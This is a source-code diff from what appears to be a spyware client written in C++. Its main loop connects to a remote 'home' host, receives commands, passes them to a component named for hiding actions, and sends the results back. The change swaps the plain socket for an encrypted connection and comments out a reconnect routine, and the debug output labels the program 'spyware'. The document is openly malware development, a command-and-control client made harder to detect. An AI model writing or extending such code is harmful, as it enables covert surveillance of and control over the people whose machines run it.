@@ -2,6 +2,7 @@
 
 #include "../Maneger/Connection.h"
 #include "../Maneger/SocketConnection.h"
+#include "../Maneger/EncSocketConnection.h"
 
 #include "../IncludeCPP/Status.h"
 
@@ -21,7 +22,7 @@ int initRun(std::shared_ptr<Connection> conn);
 
 #define DEBUG
 
-void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);
+void loopIter(std::shared_ptr<EncSocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);
 
 
 int main() {
@@ -30,11 +31,11 @@ int main() {
     
     HiderManeger& hiderManeger = HiderManeger::getInstance();
     ContraptionAdmin admin;
-    std::shared_ptr<SocketConnection> conn;
+    std::shared_ptr<EncSocketConnection> conn;
     
     sleep(2); // wait for python to start
 
-    if (SocketConnection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+    if (EncSocketConnection::connectEncTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
         exit(EXIT_FAILURE);
     }
     bool cont = true;
@@ -42,6 +43,12 @@ int main() {
     {
         loopIter(conn, hiderManeger, admin);
         std::cerr << "spyware: compleated loop iter\n";
+        // if (conn->checkShutdown()) {
+        //     if (EncSocketConnection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+        //         std::cerr << "Spyware: Connection home failed after shutdown\n";
+        //         exit(EXIT_FAILURE);
+        //     }
+        // }
     }
 
     return EXIT_SUCCESS;
@@ -62,7 +69,7 @@ int initRun(std::shared_ptr<Connection> conn) {
 }
 
 
-void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
+void loopIter(std::shared_ptr<EncSocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
 {
     command cmd;
 
@@ -96,7 +103,7 @@ void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger
         stat = hiderManeger.hiddenAction(cmd, conn);
     }
 
-    conn->flushInput();
+    // conn->flushInput();
     std::cerr << "Spyware:  Conn: res-" << stat << "\nresponse-" << strRes << std::endl;
     conn->sendResponce(stat, strRes);
     std::cerr << "Spyware: responce sent" << std::endl;
